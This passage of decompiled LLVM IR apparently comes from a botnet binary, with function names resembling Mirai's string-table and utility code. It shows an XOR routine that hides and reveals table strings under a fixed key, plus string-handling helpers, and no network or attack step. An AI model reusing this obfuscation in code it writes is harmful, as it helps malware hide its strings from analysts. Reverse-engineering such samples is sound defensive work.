  uselistorder void (i8, i8*, i32)* @add_entry, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 4, { 2, 0, 3, 4, 5, 6, 7, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18 }
}

define void @table_unlock_val(i8 %id) local_unnamed_addr {
entry:
  %v3_18ff0 = load i32, i32* @fp, align 4
  call void @toggle_obf(i8 %id)
  store i32 %v3_18ff0, i32* @fp, align 4
  ret void
}

define void @table_lock_val(i8 %id) local_unnamed_addr {
entry:
  %v3_1903c = load i32, i32* @fp, align 4
  call void @toggle_obf(i8 %id)
  store i32 %v3_1903c, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder void (i8)* @toggle_obf, { 1, 0 }
}

define i8* @table_retrieve_val(i32 %id, i32* %len) local_unnamed_addr {
entry:
  %v3_190a0 = mul i32 %id, 8
  store i32 %v3_190a0, i32* @r2, align 4
  %v2_190ac = add i32 %v3_190a0, ptrtoint (i32* @table to i32)
  %v2_190b8 = icmp eq i32* %len, null
  br i1 %v2_190b8, label %dec_label_pc_190d4, label %dec_label_pc_190c0

dec_label_pc_190c0:                               ; preds = %entry
  %v1_190c4 = add i32 %v3_190a0, add (i32 ptrtoint (i32* @table to i32), i32 4)
  %v2_190c4 = inttoptr i32 %v1_190c4 to i16*
  %v3_190c4 = load i16, i16* %v2_190c4, align 4
  %v4_190c4 = zext i16 %v3_190c4 to i32
  store i32 %v4_190c4, i32* @r2, align 4
  store i32 %v4_190c4, i32* %len, align 4
  br label %dec_label_pc_190d4

dec_label_pc_190d4:                               ; preds = %entry, %dec_label_pc_190c0
  %v1_190d8 = inttoptr i32 %v2_190ac to i32*
  %v2_190d8 = load i32, i32* %v1_190d8, align 4
  %v1_190dc = inttoptr i32 %v2_190d8 to i8*
  ret i8* %v1_190dc

; uselistorder directives
  uselistorder i32 %v3_190a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_190d4, { 1, 0 }
}

define void @add_entry(i8 %id, i8* %buf, i32 %buf_len) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_190f4 = load i32, i32* @fp, align 4
  store i32 102652, i32* %stack_var_-4, align 4
  %v2_190f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_190f8, i32* @fp, align 4
  %v1_19118 = call i32 @malloc(i32 %buf_len)
  %v4_19120 = inttoptr i32 %v1_19118 to i8*
  call void @util_memcpy(i8* %v4_19120, i8* %buf, i32 %buf_len)
  %v4_19134 = zext i8 %id to i32
  %v5_19140 = mul nuw nsw i32 %v4_19134, 8
  %v6_19140 = add i32 %v5_19140, ptrtoint (i32* @table to i32)
  %v7_19140 = inttoptr i32 %v6_19140 to i32*
  store i32 %v1_19118, i32* %v7_19140, align 4
  %v3_1915c = mul nuw nsw i32 %v4_19134, 8
  %v2_19164 = add i32 %v3_1915c, add (i32 ptrtoint (i32* @table to i32), i32 4)
  %v1_19168 = trunc i32 %buf_len to i16
  %v3_19168 = inttoptr i32 %v2_19164 to i16*
  store i16 %v1_19168, i16* %v3_19168, align 4
  store i32 %v3_190f4, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %buf_len, { 0, 2, 1 }
}

define void @toggle_obf(i8 %id) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_1917c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_1917c, i32* @ip, align 4
  %v4_19194 = zext i8 %id to i32
  %v3_19198 = mul nuw nsw i32 %v4_19194, 8
  %v2_191a4 = add i32 %v3_19198, ptrtoint (i32* @table to i32)
  %v2_191b0 = load i32, i32* @table_key, align 4
  %v1_191b4 = trunc i32 %v2_191b0 to i8
  %v3_191c0 = udiv i32 %v2_191b0, 256
  %v1_191c4 = trunc i32 %v3_191c0 to i8
  %v3_191d0 = udiv i32 %v2_191b0, 65536
  %v1_191d4 = trunc i32 %v3_191d0 to i8
  %v3_191e0 = udiv i32 %v2_191b0, 16777216
  %v1_191e4 = trunc i32 %v3_191e0 to i8
  %sext = mul i32 %v2_191a4, 16777216
  %v4_192d0 = sdiv i32 %sext, 16777216
  %v1_192d4 = add nsw i32 %v4_192d0, 4
  %v2_192d4 = inttoptr i32 %v1_192d4 to i16*
  %v1_191f8 = inttoptr i32 %v4_192d0 to i32*
  br label %dec_label_pc_192d0

dec_label_pc_191f4:                               ; preds = %dec_label_pc_192d0
  %v2_191f8 = load i32, i32* %v1_191f8, align 4
  %v2_19200 = add i32 %v2_191f8, %storemerge5
  %v2_19210 = add i32 %v2_191f8, %storemerge5
  %v1_19214 = inttoptr i32 %v2_19210 to i8*
  %v2_19214 = load i8, i8* %v1_19214, align 1
  %v2_1921c1 = xor i8 %v2_19214, %v1_191b4
  %v3_19224 = inttoptr i32 %v2_19200 to i8*
  store i8 %v2_1921c1, i8* %v3_19224, align 1
  %v2_1922c = load i32, i32* %v1_191f8, align 4
  %v2_19234 = add i32 %v2_1922c, %storemerge5
  %v2_19244 = add i32 %v2_1922c, %storemerge5
  %v1_19248 = inttoptr i32 %v2_19244 to i8*
  %v2_19248 = load i8, i8* %v1_19248, align 1
  %v2_192502 = xor i8 %v2_19248, %v1_191c4
  %v3_19258 = inttoptr i32 %v2_19234 to i8*
  store i8 %v2_192502, i8* %v3_19258, align 1
  %v2_19260 = load i32, i32* %v1_191f8, align 4
  %v2_19268 = add i32 %v2_19260, %storemerge5
  %v2_19278 = add i32 %v2_19260, %storemerge5
  %v1_1927c = inttoptr i32 %v2_19278 to i8*
  %v2_1927c = load i8, i8* %v1_1927c, align 1
  %v2_192843 = xor i8 %v2_1927c, %v1_191d4
  %v3_1928c = inttoptr i32 %v2_19268 to i8*
  store i8 %v2_192843, i8* %v3_1928c, align 1
  %v2_19294 = load i32, i32* %v1_191f8, align 4
  %v2_1929c = add i32 %v2_19294, %storemerge5
  store i32 %v2_1929c, i32* @r1, align 4
  %v2_192a4 = load i32, i32* %v1_191f8, align 4
  %v2_192ac = add i32 %v2_192a4, %storemerge5
  %v1_192b0 = inttoptr i32 %v2_192ac to i8*
  %v2_192b0 = load i8, i8* %v1_192b0, align 1
  %v2_192b84 = xor i8 %v2_192b0, %v1_191e4
  %v3_192c0 = inttoptr i32 %v2_1929c to i8*
  store i8 %v2_192b84, i8* %v3_192c0, align 1
  %v1_192c8 = add i32 %storemerge5, 1
  br label %dec_label_pc_192d0

dec_label_pc_192d0:                               ; preds = %entry, %dec_label_pc_191f4
  %storemerge5 = phi i32 [ 0, %entry ], [ %v1_192c8, %dec_label_pc_191f4 ]
  %v3_192d4 = load i16, i16* %v2_192d4, align 2
  %v4_192d4 = zext i16 %v3_192d4 to i32
  store i32 %v4_192d4, i32* @r2, align 4
  store i32 %storemerge5, i32* @r3, align 4
  %v8_192e4 = icmp sgt i32 %v4_192d4, %storemerge5
  br i1 %v8_192e4, label %dec_label_pc_191f4, label %dec_label_pc_192e8

dec_label_pc_192e8:                               ; preds = %dec_label_pc_192d0
  ret void

; uselistorder directives
  uselistorder i32 %storemerge5, { 10, 9, 7, 6, 5, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 ptrtoint (i32* @table to i32), { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_192d0, { 1, 0 }
}

define i32 @util_strlen(i8* %str) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_192fc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_192fc, i32* @ip, align 4
  br label %dec_label_pc_19328

dec_label_pc_1931c:                               ; preds = %dec_label_pc_19328
  %v4_19328 = ptrtoint i8* %stack_var_-28.0 to i32
  %v1_19344 = add i32 %v4_19328, 1
  %v5_19348 = inttoptr i32 %v1_19344 to i8*
  %v1_19320 = add i32 %storemerge2, 1
  br label %dec_label_pc_19328

dec_label_pc_19328:                               ; preds = %entry, %dec_label_pc_1931c
  %stack_var_-28.0 = phi i8* [ %str, %entry ], [ %v5_19348, %dec_label_pc_1931c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_19320, %dec_label_pc_1931c ]
  %v2_1932c = load i8, i8* %stack_var_-28.0, align 1
  %v2_19330 = icmp eq i8 %v2_1932c, 0
  br i1 %v2_19330, label %dec_label_pc_19354, label %dec_label_pc_1931c

dec_label_pc_19354:                               ; preds = %dec_label_pc_19328
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder label %dec_label_pc_19328, { 1, 0 }
}

define i8 @util_strncmp(i8* %str1, i8* %str2, i32 %len) local_unnamed_addr {
entry:
  %v3_1936c = load i32, i32* @fp, align 4
  %v3_19388 = call i32 @util_strlen(i8* %str1)
  %v3_19398 = call i32 @util_strlen(i8* %str2)
  %v5_193b0 = icmp slt i32 %v3_19388, %len
  br i1 %v5_193b0, label %dec_label_pc_193c4, label %dec_label_pc_193b4

dec_label_pc_193b4:                               ; preds = %entry
  %tmp4 = ptrtoint i8* %str1 to i32
  %v6_193c0 = icmp slt i32 %v3_19398, %len
  br i1 %v6_193c0, label %dec_label_pc_193c4, label %dec_label_pc_1941c

dec_label_pc_193c4:                               ; preds = %dec_label_pc_193b4, %entry
  br label %dec_label_pc_1943c

dec_label_pc_193d0:                               ; preds = %dec_label_pc_1941c
  %v1_19420 = add i32 %stack_var_-36.0, -1
  %v1_193d4 = inttoptr i32 %l1_-28.0 to i8*
  %v2_193d4 = load i8, i8* %v1_193d4, align 1
  %v4_193d8 = ptrtoint i8* %stack_var_-32.0 to i32
  %v2_193dc = load i8, i8* %stack_var_-32.0, align 1
  %v9_193e0 = icmp eq i8 %v2_193d4, %v2_193dc
  %v1_193f4 = add i32 %l1_-28.0, 1
  %v1_19400 = add i32 %v4_193d8, 1
  %v5_19404 = inttoptr i32 %v1_19400 to i8*
  br i1 %v9_193e0, label %dec_label_pc_1941c, label %dec_label_pc_19410

dec_label_pc_19410:                               ; preds = %dec_label_pc_193d0
  br label %dec_label_pc_1943c

dec_label_pc_1941c:                               ; preds = %dec_label_pc_193b4, %dec_label_pc_193d0
  %stack_var_-36.0 = phi i32 [ %v1_19420, %dec_label_pc_193d0 ], [ %len, %dec_label_pc_193b4 ]
  %stack_var_-32.0 = phi i8* [ %v5_19404, %dec_label_pc_193d0 ], [ %str2, %dec_label_pc_193b4 ]
  %l1_-28.0 = phi i32 [ %v1_193f4, %dec_label_pc_193d0 ], [ %tmp4, %dec_label_pc_193b4 ]
  %v3_1942c = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_1942c, label %dec_label_pc_19434, label %dec_label_pc_193d0

dec_label_pc_19434:                               ; preds = %dec_label_pc_1941c
  br label %dec_label_pc_1943c

dec_label_pc_1943c:                               ; preds = %dec_label_pc_19410, %dec_label_pc_193c4, %dec_label_pc_19434
  %v3_1943c.off0 = phi i8 [ 0, %dec_label_pc_19410 ], [ 0, %dec_label_pc_193c4 ], [ 1, %dec_label_pc_19434 ]
  store i32 %v3_1936c, i32* @fp, align 4
  ret i8 %v3_1943c.off0

; uselistorder directives
  uselistorder i32 %l1_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i8* %str1, { 1, 0 }
  uselistorder label %dec_label_pc_1943c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1941c, { 1, 0 }
}

define i8 @util_strcmp(i8* %str1, i8* %str2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i8* %str1 to i32
  %v3_19454 = load i32, i32* @fp, align 4
  %v3_1946c = call i32 @util_strlen(i8* %str1)
  %v3_1947c = call i32 @util_strlen(i8* %str2)
  store i32 %v3_1946c, i32* @r2, align 4
  %v9_19490 = icmp eq i32 %v3_1946c, %v3_1947c
  br i1 %v9_19490, label %dec_label_pc_194f0, label %dec_label_pc_19498

dec_label_pc_19498:                               ; preds = %entry
  br label %dec_label_pc_19510

dec_label_pc_194a4:                               ; preds = %dec_label_pc_194f0
  %v1_194f4 = add i32 %l2_-24.0, -1
  %v1_194a8 = inttoptr i32 %l1_-28.0 to i8*
  %v2_194a8 = load i8, i8* %v1_194a8, align 1
  %v4_194ac = ptrtoint i8* %stack_var_-32.0 to i32
  %v2_194b0 = load i8, i8* %stack_var_-32.0, align 1
  %v9_194b4 = icmp eq i8 %v2_194a8, %v2_194b0
  %tmp16 = zext i1 %v9_194b4 to i32
  %. = xor i32 %tmp16, 1
  store i32 %., i32* @r2, align 4
  %v1_194c8 = add i32 %l1_-28.0, 1
  %v1_194d4 = add i32 %v4_194ac, 1
  %v5_194d8 = inttoptr i32 %v1_194d4 to i8*
  br i1 %v9_194b4, label %dec_label_pc_194f0, label %dec_label_pc_194e4

dec_label_pc_194e4:                               ; preds = %dec_label_pc_194a4
  br label %dec_label_pc_19510

dec_label_pc_194f0:                               ; preds = %entry, %dec_label_pc_194a4
  %l2_-24.0 = phi i32 [ %v1_194f4, %dec_label_pc_194a4 ], [ %v3_1946c, %entry ]
  %stack_var_-32.0 = phi i8* [ %v5_194d8, %dec_label_pc_194a4 ], [ %str2, %entry ]
  %l1_-28.0 = phi i32 [ %v1_194c8, %dec_label_pc_194a4 ], [ %tmp3, %entry ]
  %v3_19500 = icmp eq i32 %l2_-24.0, 0
  br i1 %v3_19500, label %dec_label_pc_19508, label %dec_label_pc_194a4

dec_label_pc_19508:                               ; preds = %dec_label_pc_194f0
  br label %dec_label_pc_19510

dec_label_pc_19510:                               ; preds = %dec_label_pc_194e4, %dec_label_pc_19498, %dec_label_pc_19508
  %stack_var_-36.0.off0 = phi i8 [ 1, %dec_label_pc_19508 ], [ 0, %dec_label_pc_194e4 ], [ 0, %dec_label_pc_19498 ]
  store i32 %v3_19454, i32* @fp, align 4
  ret i8 %stack_var_-36.0.off0

; uselistorder directives
  uselistorder i32 %l1_-28.0, { 1, 0 }
  uselistorder i32 %l2_-24.0, { 1, 0 }
  uselistorder i1 %v9_194b4, { 1, 0 }
  uselistorder i32 %v3_1946c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19510, { 2, 0, 1 }
  uselistorder label %dec_label_pc_194f0, { 1, 0 }
}

define i32 @util_strcpy(i8* %dst, i8* %src) local_unnamed_addr {
entry:
  %v3_19528 = load i32, i32* @fp, align 4
  %v3_19540 = call i32 @util_strlen(i8* %src)
  %v1_19550 = add i32 %v3_19540, 1
  call void @util_memcpy(i8* %dst, i8* %src, i32 %v1_19550)
  store i32 %v3_19528, i32* @fp, align 4
  ret i32 %v3_19540

; uselistorder directives
  uselistorder void (i8*, i8*, i32)* @util_memcpy, { 0, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
}

define void @util_memcpy(i8* %dst, i8* %src, i32 %len) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %src to i32
  store i32 %tmp, i32* @r1, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_19578 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_19578, i32* @ip, align 4
  %v3_195e03 = icmp eq i32 %len, 0
  br i1 %v3_195e03, label %dec_label_pc_195e8, label %dec_label_pc_195a8

dec_label_pc_195a8:                               ; preds = %entry, %dec_label_pc_195a8
  %v1_195d410.in = phi i32 [ %v1_195d410, %dec_label_pc_195a8 ], [ %len, %entry ]
  %storemerge9 = phi i8* [ %v4_195cc, %dec_label_pc_195a8 ], [ %src, %entry ]
  %r_src_-24.08 = phi i8* [ %v4_195c0, %dec_label_pc_195a8 ], [ %dst, %entry ]
  %v1_195d410 = add i32 %v1_195d410.in, -1
  %v4_195a8 = ptrtoint i8* %storemerge9 to i32
  %v2_195ac = load i8, i8* %storemerge9, align 1
  %v4_195b0 = ptrtoint i8* %r_src_-24.08 to i32
  store i8 %v2_195ac, i8* %r_src_-24.08, align 1
  %v1_195bc = add i32 %v4_195b0, 1
  %v4_195c0 = inttoptr i32 %v1_195bc to i8*
  %v1_195c8 = add i32 %v4_195a8, 1
  %v4_195cc = inttoptr i32 %v1_195c8 to i8*
  %v3_195e0 = icmp eq i32 %v1_195d410, 0
  br i1 %v3_195e0, label %dec_label_pc_195e8, label %dec_label_pc_195a8

dec_label_pc_195e8:                               ; preds = %dec_label_pc_195a8, %entry
  ret void

; uselistorder directives
  uselistorder label %dec_label_pc_195a8, { 1, 0 }
}

define void @util_zero(i8* %buf, i32 %len) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v1_196342 = add i32 %len, -1
  store i32 %v1_196342, i32* %stack_var_-32, align 4
  %v3_196403 = icmp eq i32 %len, 0
  br i1 %v3_196403, label %dec_label_pc_19648, label %dec_label_pc_19618

dec_label_pc_19618:                               ; preds = %entry, %dec_label_pc_19618
  %storemerge8 = phi i8* [ %v4_1962c, %dec_label_pc_19618 ], [ %buf, %entry ]
  %v4_19618 = ptrtoint i8* %storemerge8 to i32
  store i8 0, i8* %storemerge8, align 1
  %v1_19628 = add i32 %v4_19618, 1
  %v4_1962c = inttoptr i32 %v1_19628 to i8*
  %v3_19630.pr = load i32, i32* %stack_var_-32, align 4
  %v1_19634 = add i32 %v3_19630.pr, -1
  store i32 %v1_19634, i32* %stack_var_-32, align 4
  %v3_19640 = icmp eq i32 %v3_19630.pr, 0
  br i1 %v3_19640, label %dec_label_pc_19648, label %dec_label_pc_19618

dec_label_pc_19648:                               ; preds = %dec_label_pc_19618, %entry
  ret void

; uselistorder directives
  uselistorder i32* %stack_var_-32, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19618, { 1, 0 }
}

define i32 @util_atoi(i8* %str, i32 %base) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %str to i32
  %v3_19658 = load i32, i32* @fp, align 4
  br label %dec_label_pc_1967c

dec_label_pc_1967c:                               ; preds = %dec_label_pc_1967c, %entry
  %acc_-44.0 = phi i32 [ %tmp, %entry ], [ %v1_1968c, %dec_label_pc_1967c ]
  %v1_19680 = inttoptr i32 %acc_-44.0 to i8*
  %v2_19680 = load i8, i8* %v1_19680, align 1
  %v1_1968c = add i32 %acc_-44.0, 1
  %v3_196a0 = call i32 @util_isspace(i8 %v2_19680)
  %v2_196a8 = icmp eq i32 %v3_196a0, 0
  br i1 %v2_196a8, label %dec_label_pc_196b0, label %dec_label_pc_1967c

dec_label_pc_196b0:                               ; preds = %dec_label_pc_1967c
  %v7_196b4 = icmp eq i8 %v2_19680, 45
  br i1 %v7_196b4, label %dec_label_pc_19710, label %dec_label_pc_196e0

dec_label_pc_196e0:                               ; preds = %dec_label_pc_196b0
  %v7_196e4 = icmp eq i8 %v2_19680, 43
  br i1 %v7_196e4, label %dec_label_pc_196ec, label %dec_label_pc_1971c

dec_label_pc_196ec:                               ; preds = %dec_label_pc_196e0
  %v1_196f0 = inttoptr i32 %v1_1968c to i8*
  %v2_196f0 = load i8, i8* %v1_196f0, align 1
  %v1_196fc = add i32 %acc_-44.0, 2
  br label %dec_label_pc_1971c

dec_label_pc_19710:                               ; preds = %dec_label_pc_196b0
  %v1_196c8 = inttoptr i32 %v1_1968c to i8*
  %v2_196c8 = load i8, i8* %v1_196c8, align 1
  %v1_196d4 = add i32 %acc_-44.0, 2
  br label %dec_label_pc_19724

dec_label_pc_1971c:                               ; preds = %dec_label_pc_196ec, %dec_label_pc_196e0
  %cutoff_-36.0.ph.in = phi i8 [ %v2_19680, %dec_label_pc_196e0 ], [ %v2_196f0, %dec_label_pc_196ec ]
  %acc_-44.1.ph = phi i32 [ %v1_1968c, %dec_label_pc_196e0 ], [ %v1_196fc, %dec_label_pc_196ec ]
  br label %dec_label_pc_19724

dec_label_pc_19724:                               ; preds = %dec_label_pc_19710, %dec_label_pc_1971c
  %acc_-44.112 = phi i32 [ %acc_-44.1.ph, %dec_label_pc_1971c ], [ %v1_196d4, %dec_label_pc_19710 ]
  %cutoff_-36.010.in = phi i8 [ %cutoff_-36.0.ph.in, %dec_label_pc_1971c ], [ %v2_196c8, %dec_label_pc_19710 ]
  %v2_1970814 = phi i1 [ true, %dec_label_pc_1971c ], [ false, %dec_label_pc_19710 ]
  %storemerge3 = phi i32 [ 2147483647, %dec_label_pc_1971c ], [ -2147483648, %dec_label_pc_19710 ]
  %v2_1973c = udiv i32 %storemerge3, %base
  %v3_1973c = urem i32 %storemerge3, %base
  br label %dec_label_pc_19770

dec_label_pc_19770:                               ; preds = %dec_label_pc_19878, %dec_label_pc_19724
  %c_-40.0 = phi i32 [ 0, %dec_label_pc_19724 ], [ %c_-40.1, %dec_label_pc_19878 ]
  %cutoff_-36.1.in = phi i8 [ %cutoff_-36.010.in, %dec_label_pc_19724 ], [ %v2_1987c, %dec_label_pc_19878 ]
  %cutlim_-24.0 = phi i32 [ 0, %dec_label_pc_19724 ], [ %cutlim_-24.1, %dec_label_pc_19878 ]
  %acc_-44.2 = phi i32 [ %acc_-44.112, %dec_label_pc_19724 ], [ %v1_19888, %dec_label_pc_19878 ]
  %cutoff_-36.1 = zext i8 %cutoff_-36.1.in to i32
  %v3_1977c = call i32 @util_isdigit(i8 %cutoff_-36.1.in)
  %v2_19784 = icmp eq i32 %v3_1977c, 0
  br i1 %v2_19784, label %dec_label_pc_1979c, label %dec_label_pc_1978c

dec_label_pc_1978c:                               ; preds = %dec_label_pc_19770
  %v1_19790 = add nsw i32 %cutoff_-36.1, -48
  br label %dec_label_pc_197f8

dec_label_pc_1979c:                               ; preds = %dec_label_pc_19770
  %v3_197a8 = call i32 @util_isalpha(i8 %cutoff_-36.1.in)
  %v2_197b0 = icmp eq i32 %v3_197a8, 0
  br i1 %v2_197b0, label %dec_label_pc_19894, label %dec_label_pc_197b8

dec_label_pc_197b8:                               ; preds = %dec_label_pc_1979c
  %v3_197c4 = call i32 @util_isupper(i8 %cutoff_-36.1.in)
  %v2_197cc = icmp eq i32 %v3_197c4, 0
  br i1 %v2_197cc, label %dec_label_pc_197e0, label %dec_label_pc_197d4

dec_label_pc_197d4:                               ; preds = %dec_label_pc_197b8
  br label %dec_label_pc_197e8

dec_label_pc_197e0:                               ; preds = %dec_label_pc_197b8
  br label %dec_label_pc_197e8

dec_label_pc_197e8:                               ; preds = %dec_label_pc_197d4, %dec_label_pc_197e0
  %storemerge2 = phi i32 [ 87, %dec_label_pc_197e0 ], [ 55, %dec_label_pc_197d4 ]
  %v2_197f0 = sub nsw i32 %cutoff_-36.1, %storemerge2
  br label %dec_label_pc_197f8

dec_label_pc_197f8:                               ; preds = %dec_label_pc_1978c, %dec_label_pc_197e8
  %storemerge4 = phi i32 [ %v1_19790, %dec_label_pc_1978c ], [ %v2_197f0, %dec_label_pc_197e8 ]
  %v2_19800 = sub i32 %storemerge4, %base
  %v4_19800 = xor i32 %storemerge4, %base
  %v5_19800 = xor i32 %v2_19800, %storemerge4
  %v6_19800 = and i32 %v5_19800, %v4_19800
  %v7_19800 = icmp slt i32 %v6_19800, 0
  %v8_19800 = icmp slt i32 %v2_19800, 0
  %v2_19804 = xor i1 %v8_19800, %v7_19800
  br i1 %v2_19804, label %dec_label_pc_19808, label %dec_label_pc_19894

dec_label_pc_19808:                               ; preds = %dec_label_pc_197f8
  %v1_1980c = icmp slt i32 %cutlim_-24.0, 0
  br i1 %v1_1980c, label %dec_label_pc_19878, label %dec_label_pc_19814

dec_label_pc_19814:                               ; preds = %dec_label_pc_19808
  %v3_1981c = icmp uge i32 %c_-40.0, %v2_1973c
  %v9_1981c = icmp eq i32 %c_-40.0, %v2_1973c
  %v2_19820 = xor i1 %v9_1981c, true
  %v3_19820 = and i1 %v3_1981c, %v2_19820
  br i1 %v3_19820, label %dec_label_pc_19878, label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %dec_label_pc_19814
  br i1 %v9_1981c, label %dec_label_pc_19834, label %dec_label_pc_19850

dec_label_pc_19834:                               ; preds = %dec_label_pc_19824
  %v2_1983c = sub i32 %storemerge4, %v3_1973c
  %v4_1983c = xor i32 %storemerge4, %v3_1973c
  %v5_1983c = xor i32 %v2_1983c, %storemerge4
  %v6_1983c = and i32 %v5_1983c, %v4_1983c
  %v7_1983c = icmp slt i32 %v6_1983c, 0
  %v8_1983c = icmp slt i32 %v2_1983c, 0
  %v9_1983c = icmp eq i32 %storemerge4, %v3_1973c
  %v3_19840 = xor i1 %v8_1983c, %v7_1983c
  %v4_19840 = or i1 %v9_1983c, %v3_19840
  br i1 %v4_19840, label %dec_label_pc_19850, label %dec_label_pc_19878

dec_label_pc_19850:                               ; preds = %dec_label_pc_19824, %dec_label_pc_19834
  %v2_19860 = mul i32 %c_-40.0, %base
  %v2_19870 = add i32 %storemerge4, %v2_19860
  br label %dec_label_pc_19878

dec_label_pc_19878:                               ; preds = %dec_label_pc_19808, %dec_label_pc_19814, %dec_label_pc_19834, %dec_label_pc_19850
  %c_-40.1 = phi i32 [ %v2_19870, %dec_label_pc_19850 ], [ %v2_1973c, %dec_label_pc_19834 ], [ %c_-40.0, %dec_label_pc_19814 ], [ %c_-40.0, %dec_label_pc_19808 ]
  %cutlim_-24.1 = phi i32 [ 1, %dec_label_pc_19850 ], [ -1, %dec_label_pc_19834 ], [ -1, %dec_label_pc_19814 ], [ -1, %dec_label_pc_19808 ]
  %v1_1987c = inttoptr i32 %acc_-44.2 to i8*
  %v2_1987c = load i8, i8* %v1_1987c, align 1
  %v1_19888 = add i32 %acc_-44.2, 1
  br label %dec_label_pc_19770

dec_label_pc_19894:                               ; preds = %dec_label_pc_197f8, %dec_label_pc_1979c
  %v1_19898 = icmp slt i32 %cutlim_-24.0, 0
  br i1 %v1_19898, label %dec_label_pc_198a0, label %dec_label_pc_198cc

dec_label_pc_198a0:                               ; preds = %dec_label_pc_19894
  br i1 %v2_1970814, label %dec_label_pc_198b8, label %dec_label_pc_198ac

dec_label_pc_198ac:                               ; preds = %dec_label_pc_198a0
  br label %dec_label_pc_198c0

dec_label_pc_198b8:                               ; preds = %dec_label_pc_198a0
  br label %dec_label_pc_198c0

dec_label_pc_198c0:                               ; preds = %dec_label_pc_198ac, %dec_label_pc_198b8
  %storemerge = phi i32 [ 2147483647, %dec_label_pc_198b8 ], [ -2147483648, %dec_label_pc_198ac ]
  br label %dec_label_pc_198e4

dec_label_pc_198cc:                               ; preds = %dec_label_pc_19894
  br i1 %v2_1970814, label %dec_label_pc_198e4, label %dec_label_pc_198d8

dec_label_pc_198d8:                               ; preds = %dec_label_pc_198cc
  %v1_198dc = sub i32 0, %c_-40.0
  br label %dec_label_pc_198e4

dec_label_pc_198e4:                               ; preds = %dec_label_pc_198cc, %dec_label_pc_198c0, %dec_label_pc_198d8
  %c_-40.2 = phi i32 [ %storemerge, %dec_label_pc_198c0 ], [ %c_-40.0, %dec_label_pc_198cc ], [ %v1_198dc, %dec_label_pc_198d8 ]
  store i32 %v3_19658, i32* @fp, align 4
  ret i32 %c_-40.2

; uselistorder directives
  uselistorder i32 %v2_1983c, { 1, 0 }
  uselistorder i1 %v9_1981c, { 1, 0 }
  uselistorder i32 %v2_19800, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 5, 1, 2, 6, 3, 4, 7 }
  uselistorder i32 %cutoff_-36.1, { 1, 0 }
  uselistorder i32 %c_-40.0, { 1, 0, 3, 4, 2, 6, 5 }
  uselistorder i32 %v3_1973c, { 1, 0, 2 }
  uselistorder i1 %v2_1970814, { 1, 0 }
  uselistorder i32 %v1_1968c, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_198e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_198c0, { 1, 0 }
  uselistorder label %dec_label_pc_19878, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_19850, { 1, 0 }
  uselistorder label %dec_label_pc_197f8, { 1, 0 }
  uselistorder label %dec_label_pc_197e8, { 1, 0 }
  uselistorder label %dec_label_pc_19724, { 1, 0 }
}

define i8* @util_itoa(i32 %value, i32 %radix, i8* %string) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %string to i32
  %scratch_-66 = alloca [34 x i8], align 1
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_198fc = load i32, i32* @fp, align 4
  store i32 %v3_198fc, i32* %stack_var_-16, align 4
  store i32 104708, i32* %stack_var_-4, align 4
  %v13_198fc = ptrtoint i32* %stack_var_-16 to i32
  %v2_19900 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_19900, i32* @fp, align 4
  %v2_19918 = icmp eq i8* %string, null
  br i1 %v2_19918, label %dec_label_pc_19920, label %dec_label_pc_1992c

dec_label_pc_19920:                               ; preds = %entry
  br label %dec_label_pc_19aa0

dec_label_pc_1992c:                               ; preds = %entry
  %v1_19930 = icmp slt i32 %value, 0
  %v2_19930 = icmp eq i32 %value, 0
  br i1 %v2_19930, label %dec_label_pc_19a7c, label %dec_label_pc_19938

dec_label_pc_19938:                               ; preds = %dec_label_pc_1992c
  %v7_1994c = icmp eq i32 %radix, 10
  br i1 %v7_1994c, label %dec_label_pc_19954, label %dec_label_pc_19a18.preheader

dec_label_pc_19954:                               ; preds = %dec_label_pc_19938
  %v1_1996c = sub i32 0, %value
  %. = zext i1 %v1_19930 to i32
  %v1_1996c.value = select i1 %v1_19930, i32 %v1_1996c, i32 %value
  br label %dec_label_pc_19a18.preheader

dec_label_pc_19a18.preheader:                     ; preds = %dec_label_pc_19954, %dec_label_pc_19938
  %offset_-32.0.ph = phi i32 [ 0, %dec_label_pc_19938 ], [ %., %dec_label_pc_19954 ]
